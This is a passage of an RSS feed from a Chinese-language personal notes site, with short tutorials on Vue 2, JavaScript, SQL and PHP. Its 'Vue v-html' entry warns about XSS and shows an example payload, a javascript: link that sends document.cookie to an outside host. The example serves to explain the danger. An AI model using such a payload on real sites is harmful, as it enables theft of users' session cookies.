      <description>非等值链接 查询员工的工资和工资级别，并按工资级别降序 SELECT salary,grade_level FROM employees AS e INNER JOIN job_grades AS g ON e.salary BETWEEN g.lowest_sal AND g.highest_sal ORDER BY grade_level DESC </description>
    </item>
    
    <item>
      <title>Vue Props</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/props/</link>
      <pubDate>Mon, 23 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/props/</guid>
      <description>Props 使组件接收外部传入的数据，且属性是只读的，不可更改的，这叫做单向数据流。若需要修改，可以配合data使用，间接修改props中的数据
一个组件的属性，应该避免被除了自身以外的组件所更改或控制。
若同时配置使用 data 和 props ，会优先使用props中的数据。
传递数据 &amp;lt;Sudent ref=&amp;#34;student&amp;#34; name=&amp;#34;Rainy&amp;#34; :age=&amp;#34;20&amp;#34; sex=&amp;#34;男&amp;#34;&amp;gt;&amp;lt;/Sudent&amp;gt; 接收数据 只接收数据 props: [&amp;#34;name&amp;#34;, &amp;#34;age&amp;#34;, &amp;#34;sex&amp;#34;], 指定属性值类型 props: {  name: String,  age: Number,  sex: String, }, 限制类型、必要性、指定默认值 props: {  name: {  type: String,  // 属性的值是必须的  required: true,  },  age: {  type: Number,  // 属性的默认值  default: 0,  },   sex: {  type: String,  required: true,  }, }, 间接修改 props 中的数据 使用 data间接的修改 props</description>
    </item>
    
    <item>
      <title>Vue 组件</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E7%BB%84%E4%BB%B6/</link>
      <pubDate>Mon, 23 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E7%BB%84%E4%BB%B6/</guid>
      <description>组件 用来实现局部（特定）功能效果的代码集合。
非单文件组件 一个文件中包含 N 个组件。
非单文件组件的弊端是：组件的样式没有被封装到当前文件中。
单文件组件 一个文件中只包含 1 个组件。且该文件是vue后缀的文件。
一个vue文件中包含着三大部分： template、style 以及 script。
&amp;lt;template&amp;gt; 	&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;&amp;lt;/div&amp;gt; &amp;lt;/template&amp;gt;  &amp;lt;script&amp;gt; export default { 	template: ` &amp;lt;div&amp;gt; &amp;lt;h1 class=&amp;#39;h&amp;#39;&amp;gt;{{schoolName}}&amp;lt;/h1&amp;gt; &amp;lt;Student&amp;gt;&amp;lt;/Student&amp;gt; &amp;lt;/div&amp;gt; `, 	data() { 	return { 	schoolName: &amp;#39;学校&amp;#39;, 	}; 	}, 	components: { 	Student, 	}, }; &amp;lt;/script&amp;gt;  &amp;lt;style&amp;gt; .h1 { 	color: red; } &amp;lt;/style&amp;gt; 与 Vue 实例的区别 组件是可复用的 Vue 实例，组件的 options和 Vue 实例的options都是相同的。只有 el 和data配置不太一样。</description>
    </item>
    
    <item>
      <title>JavaScrip debugger</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%AF%AD%E5%8F%A5%E5%92%8C%E5%A3%B0%E6%98%8E/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%AF%AD%E5%8F%A5%E5%92%8C%E5%A3%B0%E6%98%8E/</guid>
      <description>debugger debugger 被调用时, 浏览器执行 JavaScrip 代码时会暂停在 debugger 语句的位置，并调用 (如果有) 浏览器的调试器进行调试。例如设置断点。</description>
    </item>
    
    <item>
      <title>JavaScript HTMLElement 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/element/htmlelement/htmlelement/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/element/htmlelement/htmlelement/</guid>
      <description>HTMLElement 方法 focus() 如果可以，将焦点聚焦在指定的元素上。
如果是创建的新元素，则必须先将创建的新元素插入到页面中，然后再执行focus()，焦点才能成功聚焦到这个新元素上。如果是先聚焦，再插入，焦点则不会聚焦到新元素上。</description>
    </item>
    
    <item>
      <title>Vs Code 使用技巧</title>
      <link>https://note.yxzi.xyz/note/technology/softwareuse/vscode/%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/softwareuse/vscode/%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</guid>
      <description>使用技巧 强行折叠代码块 #region // 折叠代码 #endregion </description>
    </item>
    
    <item>
      <title>Vue v-cloak</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-cloak/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-cloak/</guid>
      <description>v-cloak 一个没有值的指令。通常配合 CSS 一起用，可以隐藏未经 Vue 解析且带有{{}}的元素，直到 Vue 实例创建完毕。
Vue 实例创建完毕后，元素上的 v-cloak被删除。
HTML
&amp;lt;div v-cloak&amp;gt;  {{ message }} &amp;lt;/div&amp;gt; CSS
[v-cloak] { 	display: none; } 该div不会显示，直到 Vue 实例创建完毕。</description>
    </item>
    
    <item>
      <title>Vue v-html</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-html/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-html/</guid>
      <description>v-html 设置元素的 innerHTML，会覆盖元素中的所有内容。但与v-text不同的是，它会识别 HTML 元素
安全性 在网站上动态渲染任意 HTML 是非常危险的，因为容易导致 XSS 攻击。只在可信内容上使用 v-html，永不用在用户提交的内容上。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;div v-html=&amp;#34;msg&amp;#34;&amp;gt;原内容&amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
var vm = new Vue({el: &amp;#39;#app&amp;#39;,data: {msg: &amp;#39;&amp;lt;a href=javascript:location.href=&amp;#34;http://www.baidu.com?&amp;#34; + document.cookie&amp;gt;XXS 攻击&amp;lt;/a&amp;gt; &amp;#39;,},});Vue.config.productionTip = false; </description>
    </item>
    
    <item>
      <title>Vue v-once</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-once/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-once/</guid>
      <description>v-once 一个没有值的指令。只渲染当前元素一次。之后该元素被视为静态内容。可以用于优化性能。</description>
    </item>
    
    <item>
      <title>Vue v-pre</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-pre/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-pre/</guid>
      <description>v-pre 跳过当前元素和它的子元素的编译过程。使页面显示原始 Mustache 元素。
用于跳过大量没有使用指令的元素，这会加快编译速度。</description>
    </item>
    
    <item>
      <title>Vue v-text</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-text/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-text/</guid>
      <description>v-text 设置元素的文本内容。会覆盖元素中的所有内容。</description>
    </item>
    
    <item>
      <title>Vue 实例方法</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95/</guid>
      <description>实例方法 </description>
    </item>
    
    <item>
      <title>Vue 生命周期函数</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/</guid>
      <description>生命周期函数 在 Vue 的创建、使用、销毁过程中，会有许多事件，这些事件就被统称为生命周期函数，也叫作生命周期钩子。
生命周期函数的名字不可更改，但函数中的代码由我们自定义。
生命周期函数中的 this 的指向是 Vue 实例或组件实例对象。
beforeCreate() 在实例初始化之后，进行数据侦听和数据代理之前调用
created() 在实例创建完成后被立即同步调用。在这一步中，实例已完成对选项的处理，意味着以下内容已被配置完毕：数据侦听、计算属性、方法、事件/侦听器的回调函数。然而，挂载阶段还没开始，
beforeMount() 在挂载开始之前被调用。
mounted() 把初始的真实 DOM 树插入到页面后，即 Vue 实例挂载完毕后调用。
此时一般开始发送 Ajax 请求、启动定时器、绑定自定义事件、订阅消息等初始化操作。
beforeUpdate 在数据发生改变后，DOM 被更新之前被调用。此时的数据已经被改变，但页面中不是最新的数据。
updated() 此时的数据已经被改变，且页面中也是最新的数据。
beforeDestroy() 实例销毁之前调用。在这一步，实例仍然完全可用。但无法引起页面中的数据更新。
此时一般开始清除定时器、解绑自定义事件、取消订阅消息等收尾操作。
一般不在该流程操作数据，因为在此时改变数据，并不会引起页面中的数据更新。
destroyed() 实例销毁后调用。</description>
    </item>
    
    <item>
      <title>Vue 生命周期流程</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E6%B5%81%E7%A8%8B/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E6%B5%81%E7%A8%8B/</guid>
      <description>生命周期流程 flowchart TD;newVue[&amp;#34;new Vue()&amp;#34;] --&amp;gt; init[&amp;#34;初始化：事件、生命周期、但数据代理未开始。&amp;#34;];init --&amp;gt; beforeCraeate[&amp;#34;beforeCraeate()：此时无法通过 vm 访问 data 中的数据，以及 methods 中的方法。&amp;#34;];beforeCraeate --&amp;gt; againInit[&amp;#34;初始化：数据检测、数据代理。&amp;#34;];againInit ---&amp;gt;created[&amp;#34;created()：可以通过 vm 访问到 data 中的数据，以及 methods 中的方法。&amp;#34;];created --&amp;gt; 挂载流程开始挂载流程开始 --&amp;gt; el[&amp;#34;是否配置 el 选项？&amp;#34;]el --&amp;gt;|Yse| template[&amp;#34;是否配置 template 选项？&amp;#34;];el --&amp;gt;|No| $mount[&amp;#34;当 vm.$mount(el) 调用的时候&amp;#34;];$mount --&amp;gt;template;template --&amp;gt;|Yes| compileTemplate[&amp;#34;编译 template 到 render() 中&amp;#34;]compileTemplate --&amp;gt;stageOnetemplate --&amp;gt;|No|compileEl[&amp;#34;编译 el 指定元的outerHTML 作为 template&amp;#34;];compileEl --&amp;gt; stageOne[&amp;#34;此阶段 Vue 开始解析模板，生成虚拟 DOM（内存中），但页面还无法显示解析好的内容。&amp;#34;]stageOne ---&amp;gt;beforeMount[&amp;#34;beforeMount()：此时，页面呈现的是未经 Vue 编译的 DOM 结构。&amp;lt;/br&amp;gt; 此时，所有对 DOM 的操作，最终都没有效果（在 beforeMount 之前才有效果）。&amp;#34;];beforeMount --&amp;gt; $el[&amp;#34;将内存中的虚拟 DOM 转化为真实 DOM 插入到页面。（还将真实 DOM 拷贝了一份在 $el 中）&amp;#34;]$el --&amp;gt; mouted[&amp;#34;mouted()：页面中呈现的都是经过 Vue 编译到 DOM。&amp;lt;/br&amp;gt; 对 DOM 的操作均有效（但尽可能避免），至此初始化过程结束，一般在此进行：开启定时器、发送网络请求、订阅消息、绑定自定义事件等初始化操作。&amp;#34;]mouted ---&amp;gt;mountEnd[&amp;#34;mouted()：此时，挂载流程结束。更新流程开始&amp;#34;];mountEnd --&amp;gt; changes[&amp;#34;当 data 中的数据发生变化&amp;#34;];changes --&amp;gt; beforeUpdate[&amp;#34;beforeUpdate()：此时，data 中的数据是新的，但页面中的数据是旧的，即：页面尚未和最新的数据保持同步。&amp;#34;];beforeUpdate --&amp;gt; compareVNode[&amp;#34;根据新数据，生成新的虚拟 DOM，随后与旧的虚拟DOM进行比对，最终完成页面更新，即：完成了 Model —&amp;gt; view 的更新&amp;#34;];compareVNode --&amp;gt; updated[&amp;#34;updated()：此时，数据和页面都是最新的（方法和数据都可用，且能引起页面上的数据更新），即：页面和数据保持同步。&amp;#34;];updated --&amp;gt; mountEnd;updated ---&amp;gt; $destroy[&amp;#34;vm.</description>
    </item>
    
    <item>
      <title>Vue 自定义指令</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/</guid>
      <description>自定义指令 定义指令时，指令名不加v-，使用的时候需要加v-。
指令名如果是多个单词，多个单词用-隔开。
directives 局部自定义指令，一个指令就是一个函数或对象。
directives中出现的this 都指向 Window。
函数式 函数中有两个参数：
 element：指令所在的 DOM 元素。 binding：一个对象，其中的value 属性就是自定义指令的属性值。  会在什么时候被调用？
  指令与元素绑定成功时（初始化）会被调用。但此时元素还没有被 Vue 解析并插入到页面，这会导致在directives中，某些方法不能及时的生效。比如focus()。
  指令所在的模板被重新解析时。
  HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt; 	&amp;lt;h2&amp;gt;当前 n 的值为：{{n}}&amp;lt;/h2&amp;gt; 	&amp;lt;h3&amp;gt;放大十倍后的 n 为 ：&amp;lt;span v-big=&amp;#34;n&amp;#34;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/h3&amp;gt; 	&amp;lt;button @click=&amp;#34;n++&amp;#34;&amp;gt;点击后 n++&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
var vm = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	n: 1, 	}, 	directives: { 	big(element, binding) { 	element.</description>
    </item>
    
    <item>
      <title>JavaScript Math 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/math/math-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Sat, 21 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/math/math-%E6%96%B9%E6%B3%95/</guid>
      <description>Math 方法 random() 返回一个 0（= 0）到 1（&amp;lt; 1）的随机数。
floor() 向下取整，返回一个小于或等于指定数字的最大整数。
ceil() 向上取整，返回一个大于或等于指定数字的最小整数。</description>
    </item>
    
    <item>
      <title>JavaScript 匿名函数</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0/</link>
      <pubDate>Sat, 21 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0/</guid>
      <description>匿名函数 指没有名称的函数。如果单独只写一个匿名函数，此时是不符合语法要求的会报错。
function () { 	console.log(&amp;#39;该函数会报错&amp;#39;); }; 需要给匿名函数包裹一个括号，使之成为函数表达式。
(function (a, b) { 	console.log(&amp;#39;匿名函数表达式&amp;#39;); })(); 也可以将一个匿名函数赋给一个变量，再通过变量来调用这个匿名函数。
var demo = function () { 	console.log(&amp;#39;匿名函数表达式&amp;#39;); }; demo(); </description>
    </item>
    
    <item>
      <title>JavaScript 回调函数</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/</link>
      <pubDate>Sat, 21 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/</guid>
      <description>回调函数 将 A 函数当作 B 函数的参数，并被 B 函数调用，则 A 函数是 B 函数的回调函数。
一般的函数调用，可以称作是调用，然而执行时才将某个函数传入再调用的调用方式，被称为回调。</description>
    </item>
    
    <item>
      <title>Vue v-bind</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-bind/</link>
      <pubDate>Sat, 21 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-bind/</guid>
      <description>v-bind 单项数据绑，数据只能从 data 流向页面。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;img v-bind:src=&amp;#34;url&amp;#34; alt=&amp;#34;&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	url: &amp;#39;https://img1.baidu.com/it/u=999074466,1525171260&amp;amp;fm=253&amp;amp;fmt=auto&amp;amp;app=138&amp;amp;f=JPEG?w=500&amp;amp;h=333&amp;#39;, 	}, }); Vue.config.productionTip = false; 简写
&amp;lt;!-- 完整语法 --&amp;gt; &amp;lt;a v-bind:href=&amp;#34;url&amp;#34;&amp;gt;...&amp;lt;/a&amp;gt;  &amp;lt;!-- 简写 --&amp;gt; &amp;lt;a :href=&amp;#34;url&amp;#34;&amp;gt;...&amp;lt;/a&amp;gt; </description>
    </item>
    
    <item>
      <title>Vue 过滤器</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E8%BF%87%E6%BB%A4%E5%99%A8/</link>
      <pubDate>Sat, 21 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E8%BF%87%E6%BB%A4%E5%99%A8/</guid>
      <description>过滤器 对数据进行格式化后再显示。
一般用在{{}}或v-bind之中，
过滤器不会改变原来的数据。
filters 局部过滤器，只能在啊当前 Vue 实例中使用的过滤器。它将|之前的数据当作参数，并传递给在|之后的过滤函数，并作为该过滤函数的参数。
过滤函数的返回值会被作为最终值解析到模板中。
传参 过滤函数除了可以将在|之前的数据当作第一个实参时，还能接受额外的其他参数。
串联 过滤器中的多个过滤函数可以串联，用|将不同的过滤器函数分开，前一个函数的返回值会被当作后一个函数的实参。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt; 	&amp;lt;!-- 过滤器 --&amp;gt; 	&amp;lt;h3&amp;gt;Vue - filters：{{time | timeFmt}}&amp;lt;/h3&amp;gt; 	&amp;lt;!-- 过滤器地传参 --&amp;gt; 	&amp;lt;h3&amp;gt;Vue - filters：{{time | timeFmt(&amp;#39;YYYY——MM——DD&amp;#39;)}}&amp;lt;/h3&amp;gt; 	&amp;lt;!-- 过滤器串联 --&amp;gt; 	&amp;lt;h3&amp;gt;Vue - filters：{{time | timeFmt(&amp;#39;YYYY——MM——DD&amp;#39;) | mySlice(&amp;#39;YYYY&amp;#39;)}}&amp;lt;/h3&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
var vm = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	msg: &amp;#39;局部过滤器&amp;#39;, 	time: 1653135479429, 	}, 	filters: { 	timeFmt(val, str = &amp;#39;YYYY年MM月DD日&amp;#39;) { 	return dayjs(val).</description>
    </item>
    
    <item>
      <title>HTML input</title>
      <link>https://note.yxzi.xyz/note/technology/language/html/%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0/input/</link>
      <pubDate>Fri, 20 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/html/%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0/input/</guid>
      <description>input 输入框。
为input 设置不同的 type 属性，可以变化为多种形态。
radio 单选框。
需要为多个单选按钮设置相同的 name 值。
性别： &amp;lt;input type=&amp;#34;radio&amp;#34; name=&amp;#34;sex&amp;#34; id=&amp;#34;&amp;#34; /&amp;gt; &amp;lt;input type=&amp;#34;radio&amp;#34; name=&amp;#34;sex&amp;#34; id=&amp;#34;&amp;#34; /&amp;gt; </description>
    </item>
    
    <item>
      <title>Vue 修饰符</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/%E4%BF%AE%E9%A5%B0%E7%AC%A6/</link>
      <pubDate>Fri, 20 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/%E4%BF%AE%E9%A5%B0%E7%AC%A6/</guid>
      <description>修饰符 lazy 默认情况下，v-model会实时的同步元素中的数据，但如果添加了lazy，则数据会在当前元素失去焦点的时候同步元素中的数据。
trim 自动过滤输入框中的首尾空白字符。
number 自动将输入框中的内容转为数值类型。
通常是将字符串转换为数值。</description>
    </item>
    
    <item>
      <title>Vue v-model</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/v-model/</link>
      <pubDate>Thu, 19 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/v-model/</guid>
      <description>v-model 双向数据绑定，常用于表单元素（有 value 值）。
双向绑定是指：数据不仅能从 data 流向页面，也能从页面流向 data。
该指令是v-on与v-bind的复合版。
&amp;lt;!-- 类似于语法糖的写法 --&amp;gt; &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;h1&amp;gt;{{text}}&amp;lt;/h1&amp;gt;  &amp;lt;input type=&amp;#34;text&amp;#34; v-model=&amp;#34;text&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;!-- 相当于这样写--&amp;gt; &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;h1&amp;gt;{{text}}&amp;lt;/h1&amp;gt;  &amp;lt;input type=&amp;#34;text&amp;#34; :value=&amp;#34;text&amp;#34; @input=&amp;#34;text = $event.target.value&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; </description>
    </item>
    
    <item>
      <title>Vue 收集表单数据</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/%E6%94%B6%E9%9B%86%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE/</link>
      <pubDate>Thu, 19 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/%E6%94%B6%E9%9B%86%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE/</guid>
      <description>收集表单数据 用 v-model 在表单 input textarea及 select 上创建双向数据绑定。它会根据控件类型自动选取正确的方法来更新元素。
type = radio 则v-mode1收 集的是value值，且要给不同的&amp;lt;input type=&amp;quot;radio&amp;quot; /&amp;gt;配置 相同的value 值。
type = checkbox  没有配置 input 的value属性，那么v-mode1收集的就是一个布尔值（勾选 or 未勾选，） 配置input的value属性:  v- mode1的初始值是非数组，那么收集的就是布尔值（勾选 or 未勾选） v-mode1的初始值是数组，那么v-mode1收集的的就是value的属性值所组成的数组。    备注: v-mode1 的 三个修饰符:
 lazy:失去焦点再收集数据 number:输入字符串转为有效的数字 trim:输入首尾空格过滤  HTML
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt;  &amp;lt;script src=&amp;#34;https://cdn.</description>
    </item>
    
    <item>
      <title>Vue 数据响应式</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/</link>
      <pubDate>Thu, 19 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/</guid>
      <description>数据响应式 data 发生变化，视图会自动变化。
数据代理 通过一个对象代理对另一个对象中的属性的操作（读/写）.
在 Vue 中，通过 vm 来代理 data 中的属性操作（即操作 vm，就相当于操作 data），使我们更加方便的操作 data 中的数据。
// 通过 obj2 访问或修改 obj1 中的 x  var obj = { x: 100 }; var obj2 = { y: 200 };  // 给 obj2 定义一个新的属性 x Object.defineProperty(obj2, &amp;#39;x&amp;#39;, { 	get() { 	// 当访问 obj2.x 时，返回 100，并将 100 赋给 obj2.x， 	return obj.x; 	},  	// 当 obj2.x 被修改，该方法会调用，value 是修改后的新值 	set(value) { 	// 将新值赋给 obj.</description>
    </item>
    
    <item>
      <title>PHP 转换数据类型</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/%E8%BD%AC%E6%8D%A2%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</link>
      <pubDate>Wed, 18 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/%E8%BD%AC%E6%8D%A2%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</guid>
      <description>转换数据类型 在很多的条件下，需要将指定的数据类型，转换成目标数据类型。
自动转换 系统根据需求判定并转换（用的比较多，效率偏低）。
$a = &amp;#39;abc1.1.1&amp;#39;; $b = &amp;#39;1.1.1abc&amp;#39;;  // 0 + 1.1 echo $a + $b; 强制转换 它会先复制一份需要被转换的数据，然后在对这份被复制的数据进行处理（不会处理实际的数据，它处理的是自己拷贝的）。
() 在变量之前增加一个 ()，括号中的参数为目标数据类型。
$a = &amp;#39;我是字符串呀&amp;#39;; $b = 123;  // 强制转换，使 a 中的数据变为浮点型 // 但 a 本身的数据并没有变为 float echo &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;, (float)$a; echo &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;; // 0 echo &amp;#39;a = &amp;#39; . $a; //string echo &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;;  echo &amp;#39;此时 a 的数据类型依旧为：&amp;#39; . gettype($a); echo &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;; echo &amp;#39;&amp;lt;hr/&amp;gt;&amp;#39;; settype() 设定数据类型，但与前面的强制转换()不同，它会直接改变数据本身。
&amp;lt;?php $a = &amp;#39;我是字符串呀&amp;#39;; $b = 123;  // 强制设置数据类型 //true var_dump(settype($a, &amp;#39;int&amp;#39;)); echo &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;; // a 的数据类型直接被设置成了 integer，和强制转换大不一样 echo &amp;#39;a 的数据类型为：&amp;#39; .</description>
    </item>
    
    <item>
